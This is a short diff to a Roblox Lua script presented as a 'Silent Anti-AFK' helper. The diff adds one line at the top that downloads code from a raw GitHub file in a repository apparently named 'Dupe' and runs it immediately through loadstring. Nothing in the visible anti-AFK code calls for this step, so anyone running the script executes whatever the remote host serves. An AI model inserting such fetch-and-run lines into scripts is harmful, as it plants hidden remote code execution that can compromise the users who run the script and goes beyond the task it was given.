@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Krishna07-kkr/Dupe/refs/heads/main/matchapet"))()
+
 -- Silent Anti-AFK (No UI, No Messages)
 local VirtualUser = game:GetService("VirtualUser")
 local Players = game:GetService("Players")
